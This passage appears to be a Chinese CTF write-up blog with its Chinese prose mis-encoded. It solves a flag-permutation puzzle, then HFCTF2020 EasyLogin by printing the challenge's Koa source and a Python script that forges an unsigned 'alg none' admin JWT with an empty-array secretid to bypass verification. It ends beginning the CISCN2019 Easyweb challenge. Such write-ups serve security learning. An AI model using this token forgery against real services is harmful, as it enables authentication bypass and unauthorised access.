<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">pctf</span><span class="hljs-template-variable">&#123;hey_boys_im_baaaaaaaaaack!&#125;</span><br></code></pre></td></tr></table></figure>
<p>è¿™é‡Œpythonèƒ½å†™ä¸€ä¸ªè„šæœ¬</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stylus">from itertools import permutations<br><br>flag = <span class="hljs-selector-attr">[<span class="hljs-string">&quot;&#123;hey&quot;</span>, <span class="hljs-string">&quot;_boy&quot;</span>, <span class="hljs-string">&quot;aaaa&quot;</span>, <span class="hljs-string">&quot;s_im&quot;</span>, <span class="hljs-string">&quot;ck!&#125;&quot;</span>, <span class="hljs-string">&quot;_baa&quot;</span>, <span class="hljs-string">&quot;aaaa&quot;</span>, <span class="hljs-string">&quot;pctf&quot;</span>]</span><br><br>item = <span class="hljs-built_in">permutations</span>(flag)<br><span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> item:  #é€šè¿‡ <span class="hljs-keyword">for</span> å¾ªç¯è¿­ä»£æ¯ä¸ªæ’åˆ—ã€‚<br>	k = <span class="hljs-string">&#x27;&#x27;</span><span class="hljs-selector-class">.join</span>(<span class="hljs-built_in">list</span>(i))<br>	<span class="hljs-keyword">if</span> k<span class="hljs-selector-class">.startswith</span>(<span class="hljs-string">&#x27;pctf&#123;hey_boys&#x27;</span>) and k<span class="hljs-selector-attr">[-1]</span> == <span class="hljs-string">&#x27;&#125;&#x27;</span>:<br>		<span class="hljs-built_in">print</span>(k)<br><br></code></pre></td></tr></table></figure>

<p>å…ˆçœ‹permutationsæ˜¯ä»€ä¹ˆ<br><img src="/images/E2E1CYCYVSE6GNA.png" srcset="/img/loading.gif" lazyload><br>permutationså‡½æ•°è¿”å›çš„æ˜¯å¯è¿­ä»£å…ƒç´ ä¸­çš„ä¸€ä¸ªæ’åˆ—ç»„åˆï¼ˆå…¨æ’åˆ—ï¼‰ã€‚</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">k</span> = <span class="hljs-string">&#x27;&#x27;</span>.join(list(i))<br></code></pre></td></tr></table></figure>
<p>å°†å½“å‰æ’åˆ— i è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œå¹¶å°†ç»“æœèµ‹å€¼ç»™å˜é‡ kã€‚è¿™é‡Œä½¿ç”¨äº† join æ–¹æ³•æ¥è¿æ¥æ’åˆ—ä¸­çš„å­—ç¬¦ä¸²ã€‚<br>joinæ–¹æ³•é€šè¿‡åœ¨å†…éƒ¨ä¼˜åŒ–å®ç°ï¼Œèƒ½å¤Ÿæ›´æœ‰æ•ˆåœ°å¤„ç†å­—ç¬¦ä¸²è¿æ¥ï¼Œå°¤å…¶æ˜¯åœ¨å¾ªç¯ä¸­è¿æ¥å¤šä¸ªå­—ç¬¦ä¸²æ—¶ã€‚å®ƒé€šè¿‡<strong>ä¸€æ¬¡æ€§</strong>è¿æ¥æ‰€æœ‰å…ƒç´ ï¼Œè€Œä¸æ˜¯å¤šæ¬¡åˆ›å»ºæ–°çš„ä¸­é—´å­—ç¬¦ä¸²ï¼Œä»è€Œæé«˜æ€§èƒ½ã€‚</p>
<p>å½“ifæ¡ä»¶ä¸æˆç«‹æ—¶ï¼Œkçš„å€¼ä¸ä¼šåœ¨ä¸‹ä¸€ä¸ªå¾ªç¯ä¸­è¢«ä¿ç•™ã€‚æ¯æ¬¡è¿­ä»£å¼€å§‹æ—¶ï¼Œéƒ½ä¼šé‡æ–°è®¡ç®—kçš„å€¼ï¼Œå› ä¸ºå®ƒæ˜¯åœ¨forå¾ªç¯ä¸­çš„èµ‹å€¼è¯­å¥k &#x3D; â€˜â€™.join(list(i))ä¸­ç”Ÿæˆçš„ã€‚</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-keyword">if</span> k<span class="hljs-selector-class">.startswith</span>(<span class="hljs-string">&#x27;pctf&#123;hey_boys&#x27;</span>) and k<span class="hljs-selector-attr">[-1]</span> == <span class="hljs-string">&#x27;&#125;&#x27;</span><br></code></pre></td></tr></table></figure>
<p>æ£€æŸ¥å­—ç¬¦ä¸²kæ˜¯å¦ä»¥â€™pctf{hey_boysâ€™ å¼€å¤´ä¸”ä»¥ â€˜}â€™ ç»“å°¾ã€‚<br><img src="/images/OPFHATSQHPARN6HEA.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="HFCTF2020-EasyLogin"><a href="#HFCTF2020-EasyLogin" class="headerlink" title="[HFCTF2020]EasyLogin"></a>[HFCTF2020]EasyLogin</h2><p>éœ€è¦ç™»å½•ï¼Œä¹Ÿæœ‰æ³¨å†ŒåŠŸèƒ½<br>å…ˆä¸ç®¡å®ƒï¼Œçœ‹çœ‹æºç <br>æ‰¾åˆ°&#x2F;static&#x2F;js&#x2F;app.jsæ–‡ä»¶</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *  æˆ–è®¸è¯¥ç”¨ koa-static æ¥å¤„ç†é™æ€æ–‡ä»¶</span><br><span class="hljs-comment"> *  è·¯å¾„è¯¥æ€ä¹ˆé…ç½®ï¼Ÿä¸ç®¡äº†å…ˆå¡«ä¸ªæ ¹ç›®å½•XD</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">login</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">const</span> username = $(<span class="hljs-string">&quot;#username&quot;</span>).<span class="hljs-title function_">val</span>();<br>    <span class="hljs-keyword">const</span> password = $(<span class="hljs-string">&quot;#password&quot;</span>).<span class="hljs-title function_">val</span>();<br>    <span class="hljs-keyword">const</span> token = sessionStorage.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">&quot;token&quot;</span>);<br>    $.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/api/login&quot;</span>, &#123;username, password, <span class="hljs-attr">authorization</span>:token&#125;)<br>        .<span class="hljs-title function_">done</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>) &#123;<br>            <span class="hljs-keyword">const</span> &#123;status&#125; = data;<br>            <span class="hljs-keyword">if</span>(status) &#123;<br>                <span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span> = <span class="hljs-string">&quot;/home&quot;</span>;<br>            &#125;<br>        &#125;)<br>        .<span class="hljs-title function_">fail</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">xhr, textStatus, errorThrown</span>) &#123;<br>            <span class="hljs-title function_">alert</span>(xhr.<span class="hljs-property">responseJSON</span>.<span class="hljs-property">message</span>);<br>        &#125;);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">register</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">const</span> username = $(<span class="hljs-string">&quot;#username&quot;</span>).<span class="hljs-title function_">val</span>();<br>    <span class="hljs-keyword">const</span> password = $(<span class="hljs-string">&quot;#password&quot;</span>).<span class="hljs-title function_">val</span>();<br>    $.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/api/register&quot;</span>, &#123;username, password&#125;)<br>        .<span class="hljs-title function_">done</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>) &#123;<br>            <span class="hljs-keyword">const</span> &#123; token &#125; = data;<br>            sessionStorage.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">&#x27;token&#x27;</span>, token);<br>            <span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span> = <span class="hljs-string">&quot;/login&quot;</span>;<br>        &#125;)<br>        .<span class="hljs-title function_">fail</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">xhr, textStatus, errorThrown</span>) &#123;<br>            <span class="hljs-title function_">alert</span>(xhr.<span class="hljs-property">responseJSON</span>.<span class="hljs-property">message</span>);<br>        &#125;);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">logout</span>(<span class="hljs-params"></span>) &#123;<br>    $.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/api/logout&#x27;</span>).<span class="hljs-title function_">done</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>) &#123;<br>        <span class="hljs-keyword">const</span> &#123;status&#125; = data;<br>        <span class="hljs-keyword">if</span>(status) &#123;<br>            <span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span> = <span class="hljs-string">&#x27;/login&#x27;</span>;<br>        &#125;<br>    &#125;);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">getflag</span>(<span class="hljs-params"></span>) &#123;<br>    $.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/api/flag&#x27;</span>).<span class="hljs-title function_">done</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>) &#123;<br>        <span class="hljs-keyword">const</span> &#123;flag&#125; = data;<br>        $(<span class="hljs-string">&quot;#username&quot;</span>).<span class="hljs-title function_">val</span>(flag);<br>    &#125;).<span class="hljs-title function_">fail</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">xhr, textStatus, errorThrown</span>) &#123;<br>        <span class="hljs-title function_">alert</span>(xhr.<span class="hljs-property">responseJSON</span>.<span class="hljs-property">message</span>);<br>    &#125;);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>çœ‹äº†ä¸‹ï¼Œæ˜¯æ³¨å†Œç™»å½•çš„åŠŸèƒ½ï¼Œæ„Ÿè§‰æ²¡æœ‰è·å¾—flagçš„ç‚¹</p>
<p>å…ˆæ³¨å†Œç™»å½•ï¼Œå¹¶æŠ“åŒ…<br><img src="/images/BVCSTXL9GBODNC0XY2.png" srcset="/img/loading.gif" lazyload><br><img src="/images/BZWKPPG2BY1T9.png" srcset="/img/loading.gif" lazyload><br>base64è§£ç ä¸€ä¸‹<br><img src="/images/F7H1R7WV13ZKV.png" srcset="/img/loading.gif" lazyload><br>éªŒè¯æ–¹å¼é‡‡ç”¨çš„æ˜¯JWT<br>JWTæœ‰æ¼æ´å¯ä»¥åˆ©ç”¨<br>è¿™é‡Œæ”¾åˆ°å®˜ç½‘çœ‹çœ‹<a target="_blank" rel="noopener" href="https://jwt.io/">https://jwt.io/</a><br><img src="/images/FMORLAUSBGFWDEY0SKORX.png" srcset="/img/loading.gif" lazyload><br>æ„Ÿè§‰å’Œ[CISCN2019 ååŒ—èµ›åŒº Day1 Web2]ikuné¢˜å·®ä¸å¤š<br>ç”¨<a target="_blank" rel="noopener" href="https://gitcode.com/mirrors/brendan-rius/c-jwt-cracker/overview">c-jwt-cracker</a>çˆ†ä¸ªå¯†é’¥<br><img src="/images/M52RMT3BXI95IKN1Y8.png" srcset="/img/loading.gif" lazyload><br>ç­‰äº†30åˆ†é’Ÿï¼Œå—¯æ˜¯çˆ†ä¸å‡ºæ¥<br>åˆå»æŸ¥äº†æŸ¥<br>æŠ¥ä¸å‡ºæ¥åº”è¯¥æ˜¯è¿™ä¸ªåŸå› </p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">JWT </span>çš„å¯†é’¥çˆ†ç ´éœ€è¦åœ¨ä¸€å®šçš„å‰æä¸‹è¿›è¡Œï¼š<br><br>çŸ¥æ‚‰<span class="hljs-keyword">JWTä½¿ç”¨çš„åŠ å¯†ç®—æ³•</span><br><span class="hljs-keyword"></span>ä¸€æ®µæœ‰æ•ˆçš„ã€å·²ç­¾åçš„token<br>ç­¾åç”¨çš„å¯†é’¥ä¸å¤æ‚ï¼ˆå¼±å¯†é’¥ï¼‰<br></code></pre></td></tr></table></figure>
<p>å¯èƒ½æ˜¯å¯†é’¥å¤ªå¤æ‚äº†å­ğŸ˜¿<br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9376?time__1311=n4+xuDgD9DyiGQQP405DK32O=KKAKw5wN4x&alichlgref=https://www.google.com/#toc-7">JWTæ”»å‡»å­¦ä¹ </a></p>
<p>æŸ¥çœ‹wpå‘ç°app.jsé‡Œè¯´æ˜äº†æ‰€ç”¨æ¡†æ¶koa<br>koaç›®å½•çš„åŸºæœ¬ç»“æ„<br><img src="/images/20210413175013673.png" srcset="/img/loading.gif" lazyload><br>è¿™é‡Œå¤§ä½¬ä»¬æŒ‰ç…§koaæ¡†æ¶çš„å¸¸è§ç»“æ„å»è·å–ä¸‹æ§åˆ¶å™¨æ–‡ä»¶çš„æºç </p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/controllers/</span>api.js<br></code></pre></td></tr></table></figure>
<p>è®¿é—®ä¸€ä¸‹</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">crypto</span> = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;crypto&#x27;</span>);<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">fs</span> = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>)<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">jwt</span> = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;jsonwebtoken&#x27;</span>)<br><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">APIError</span> = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;../rest&#x27;</span>).APIError;<br><br>module.exports = &#123;<br>    <span class="hljs-string">&#x27;POST /api/register&#x27;</span>: <span class="hljs-title function_ invoke__">async</span> (ctx, next) =&gt; &#123;<br>        <span class="hljs-keyword">const</span> &#123;username, password&#125; = ctx.request.body;<br><br>        <span class="hljs-keyword">if</span>(!username || username === <span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">APIError</span>(<span class="hljs-string">&#x27;register error&#x27;</span>, <span class="hljs-string">&#x27;wrong username&#x27;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">global</span>.secrets.length &gt; <span class="hljs-number">100000</span>) &#123;<br>            <span class="hljs-keyword">global</span>.secrets = [];<br>        &#125;<br><br>        <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">secret</span> = crypto.<span class="hljs-title function_ invoke__">randomBytes</span>(<span class="hljs-number">18</span>).<span class="hljs-title function_ invoke__">toString</span>(<span class="hljs-string">&#x27;hex&#x27;</span>);<br>        <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">secretid</span> = <span class="hljs-keyword">global</span>.secrets.length;<br>        <span class="hljs-keyword">global</span>.secrets.<span class="hljs-title function_ invoke__">push</span>(secret)<br><br>        <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">token</span> = jwt.<span class="hljs-title function_ invoke__">sign</span>(&#123;secretid, username, password&#125;, secret, &#123;<span class="hljs-attr">algorithm</span>: <span class="hljs-string">&#x27;HS256&#x27;</span>&#125;);<br><br>        ctx.<span class="hljs-title function_ invoke__">rest</span>(&#123;<br>            <span class="hljs-attr">token</span>: token<br>        &#125;);<br><br>        await <span class="hljs-title function_ invoke__">next</span>();<br>    &#125;,<br><br>    <span class="hljs-string">&#x27;POST /api/login&#x27;</span>: <span class="hljs-title function_ invoke__">async</span> (ctx, next) =&gt; &#123;<br>        <span class="hljs-keyword">const</span> &#123;username, password&#125; = ctx.request.body;<br><br>        <span class="hljs-keyword">if</span>(!username || !password) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">APIError</span>(<span class="hljs-string">&#x27;login error&#x27;</span>, <span class="hljs-string">&#x27;username or password is necessary&#x27;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">token</span> = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;<br><br>        <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">sid</span> = JSON.<span class="hljs-title function_ invoke__">parse</span>(Buffer.<span class="hljs-keyword">from</span>(token.<span class="hljs-title function_ invoke__">split</span>(<span class="hljs-string">&#x27;.&#x27;</span>)[<span class="hljs-number">1</span>], <span class="hljs-string">&#x27;base64&#x27;</span>).<span class="hljs-title function_ invoke__">toString</span>()).secretid;<br><br>        console.<span class="hljs-title function_ invoke__">log</span>(sid)<br><br>        <span class="hljs-keyword">if</span>(sid === undefined || sid === <span class="hljs-literal">null</span> || !(sid &lt; <span class="hljs-keyword">global</span>.secrets.length &amp;&amp; sid &gt;= <span class="hljs-number">0</span>)) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">APIError</span>(<span class="hljs-string">&#x27;login error&#x27;</span>, <span class="hljs-string">&#x27;no such secret id&#x27;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">secret</span> = <span class="hljs-keyword">global</span>.secrets[sid];<br><br>        <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">user</span> = jwt.<span class="hljs-title function_ invoke__">verify</span>(token, secret, &#123;<span class="hljs-attr">algorithm</span>: <span class="hljs-string">&#x27;HS256&#x27;</span>&#125;);<br><br>        <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">status</span> = username === user.username &amp;&amp; password === user.password;<br><br>        <span class="hljs-keyword">if</span>(status) &#123;<br>            ctx.session.username = username;<br>        &#125;<br><br>        ctx.<span class="hljs-title function_ invoke__">rest</span>(&#123;<br>            status<br>        &#125;);<br><br>        await <span class="hljs-title function_ invoke__">next</span>();<br>    &#125;,<br><br>    <span class="hljs-string">&#x27;GET /api/flag&#x27;</span>: <span class="hljs-title function_ invoke__">async</span> (ctx, next) =&gt; &#123;<br>        <span class="hljs-keyword">if</span>(ctx.session.username !== <span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">APIError</span>(<span class="hljs-string">&#x27;permission error&#x27;</span>, <span class="hljs-string">&#x27;permission denied&#x27;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">flag</span> = fs.<span class="hljs-title function_ invoke__">readFileSync</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>).<span class="hljs-title function_ invoke__">toString</span>();<br>        ctx.<span class="hljs-title function_ invoke__">rest</span>(&#123;<br>            flag<br>        &#125;);<br><br>        await <span class="hljs-title function_ invoke__">next</span>();<br>    &#125;,<br><br>    <span class="hljs-string">&#x27;GET /api/logout&#x27;</span>: <span class="hljs-title function_ invoke__">async</span> (ctx, next) =&gt; &#123;<br>        ctx.session.username = <span class="hljs-literal">null</span>;<br>        ctx.<span class="hljs-title function_ invoke__">rest</span>(&#123;<br>            <span class="hljs-attr">status</span>: <span class="hljs-literal">true</span><br>        &#125;)<br>        await <span class="hljs-title function_ invoke__">next</span>();<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure>

<p><strong>ç©ºåŠ å¯†ç®—æ³•</strong><br>JWTæ”¯æŒä½¿ç”¨ç©ºåŠ å¯†ç®—æ³•ï¼Œå¯ä»¥åœ¨headerä¸­æŒ‡å®šalgä¸ºNone</p>
<p>å°†secretç½®ç©ºã€‚åˆ©ç”¨nodeçš„jsonwentokenåº“å·²çŸ¥ç¼ºé™·ï¼šå½“jwtçš„secretä¸ºnullæˆ–undefinedæ—¶ï¼Œjsonwebtokenä¼šé‡‡ç”¨algorithmä¸ºnoneè¿›è¡ŒéªŒè¯</p>
<p>å› ä¸ºalgä¸ºnone,æ‰€ä»¥åªè¦æŠŠsignatureè®¾ç½®ä¸ºç©ºï¼ˆå³ä¸æ·»åŠ signatureå­—æ®µï¼‰ï¼Œæäº¤åˆ°æœåŠ¡å™¨ï¼Œtokenéƒ½å¯ä»¥é€šè¿‡æœåŠ¡å™¨çš„éªŒè¯</p>
<p><img src="/images/PR5RZ77UV7NBH7HZ93B.png" srcset="/img/loading.gif" lazyload><br>ç”ŸæˆJWT<br><img src="/images/IIFDT3JFX9V5VAW.png" srcset="/img/loading.gif" lazyload><br>&#x2F;api&#x2F;flagè·¯å¾„æ ¡éªŒä¸ºadminç”¨æˆ·æ‰ä¼šè¿”å›flagï¼Œè€Œç™»å½•éªŒè¯æ–¹å¼é‡‡ç”¨çš„æ˜¯JWTï¼Œæ‰€ä»¥å¯ä»¥å°è¯•å¯¹JWTè¿›è¡Œç ´è§£ä¿®æ”¹ã€‚å¹¶ä¸”ç”ŸæˆJWTæ˜¯ç”¨HS256åŠ å¯†ï¼Œå¯ä»¥æŠŠå®ƒæ”¹ä¸ºNoneæ¥è¿›è¡Œç ´è§£ã€‚æ ‡é¢˜ä¸­çš„algå­—æ®µæ›´æ”¹ä¸ºnoneï¼Œæœ‰äº›JWTåº“æ”¯æŒæ— ç®—æ³•ï¼Œå³æ²¡æœ‰ç­¾åç®—æ³•ã€‚å½“algä¸ºnoneæ—¶ï¼Œåç«¯å°†ä¸æ‰§è¡Œç­¾åéªŒè¯ï¼Œæ­¤å¤–å¯¹äºæœ¬é¢˜ä¸­éªŒè¯é‡‡ç”¨çš„å¯†é’¥secretå€¼ä¹Ÿéœ€è¦ä¸ºç©ºæˆ–è€…underfinedï¼Œå¦åˆ™è¿˜æ˜¯ä¼šè§¦å‘éªŒè¯ï¼Œjsæ˜¯å¼±è¯­è¨€ç±»å‹ï¼Œæˆ‘ä»¬å¯ä»¥å°†secretidè®¾ç½®ä¸ºä¸€ä¸ªå°æ•°æˆ–ç©ºæ•°ç»„(ç©ºæ•°ç»„ä¸æ•°å­—æ¯”è¾ƒæ—¶ä¸º0)æ¥ç»•è¿‡secretidçš„ä¸€ä¸ªéªŒè¯(ä¸èƒ½ä¸ºnull&amp;undefined)<br><img src="/images/U7Z9HCB3RXK1HZLG5N.png" srcset="/img/loading.gif" lazyload><br>è¿™é‡Œéœ€è¦ä¸€ä¸ªpythonè„šæœ¬</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">import <span class="hljs-keyword">jwt</span><br><span class="hljs-keyword"></span>token_dict = &#123;<br>  <span class="hljs-string">&quot;secretid&quot;</span>: [],<br>  <span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>,<br>  <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;123&quot;</span>,<br>  <span class="hljs-string">&quot;iat&quot;</span>: <span class="hljs-number">1710510302</span><br>&#125;<br><br>headers = &#123;<br>  <span class="hljs-string">&quot;alg&quot;</span>: <span class="hljs-string">&quot;none&quot;</span>,<br>  <span class="hljs-string">&quot;typ&quot;</span>: <span class="hljs-string">&quot;JWT&quot;</span><br>&#125;<br><span class="hljs-keyword">jwt_token </span>= <span class="hljs-keyword">jwt.encode(token_dict, </span> <span class="hljs-comment"># payload, æœ‰æ•ˆè½½ä½“</span><br>                       <span class="hljs-string">&quot;&quot;</span>,  <span class="hljs-comment"># è¿›è¡ŒåŠ å¯†ç­¾åçš„å¯†é’¥</span><br>                       algorithm=<span class="hljs-string">&quot;none&quot;</span>,  <span class="hljs-comment"># æŒ‡æ˜ç­¾åç®—æ³•æ–¹å¼, é»˜è®¤ä¹Ÿæ˜¯HS256</span><br>                       headers=headers <br>                       )<br>print(<span class="hljs-keyword">jwt_token)</span><br><span class="hljs-keyword"></span><br></code></pre></td></tr></table></figure>
<p><img src="/images/21QGA8N3P1C7VO2.png" srcset="/img/loading.gif" lazyload><br>ç”Ÿæˆåæ›¿æ¢åŸæœ‰çš„<br>ç„¶åè¿›å…¥&#x2F;api&#x2F;flagæ‰¾åˆ°flag<br><img src="/images/9YW31YZD1ZY45A4P.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="CISCN2019-æ€»å†³èµ›-Day2-Web1-Easyweb"><a href="#CISCN2019-æ€»å†³èµ›-Day2-Web1-Easyweb" class="headerlink" title="[CISCN2019 æ€»å†³èµ› Day2 Web1]Easyweb"></a>[CISCN2019 æ€»å†³èµ› Day2 Web1]Easyweb</h2><p>è¿›å…¥ç¯å¢ƒï¼Œå‘ç°åªæœ‰ç™»å½•ç•Œé¢ï¼Œæ²¡æœ‰æ‰¾åˆ°æ³¨å†Œ<br>é‚£ä¹ˆå¤§æ¦‚å°±æ˜¯sqlæ³¨å…¥äº†</p>
<p>æ³¨å…¥æ²¡ååº”<br>æºç ä¹Ÿå•¥ä¹Ÿæ²¡æ‰¾åˆ°<br>ä¸Šdirsearch<br>æ‰«åˆ°robots.txt<br>ä¸çŸ¥é“ä¸ºä»€ä¹ˆè¿™é‡Œçš„robots.txtå†…å®¹ä¸º&#x2F;static&#x2F;secretkey.txt<br><img src="/images/08197AC17SPJ0T2H8BJ1.png" srcset="/img/loading.gif" lazyload><br>çœ‹äº†é¢˜è§£ï¼Œrobots.txté‡Œçš„å†…å®¹åº”è¯¥æ˜¯<br><img src="/images/UIDFOKY8DKGO5BCO3X.png" srcset="/img/loading.gif" lazyload><br>é¢˜ç›®æè¿°é‡Œæä¾›äº†æºç GitHubé“¾æ¥<br>GitHubé‡Œçš„æºç ä¹Ÿæ˜¯ä¸€æ ·<br>è¿™é‡Œä¸å¤ªæ‡‚ä¸ºä»€ä¹ˆä¼šè¿™æ ·<br>æŠŠdirsearchæ‰«åˆ°çš„å‡ ä¸ªphpæ–‡ä»¶éƒ½è¯•ä¸€é<br>æœ€ååœ¨è®¿é—®image.php.bakæ—¶æˆåŠŸä¸‹è½½æ–‡ä»¶</p>
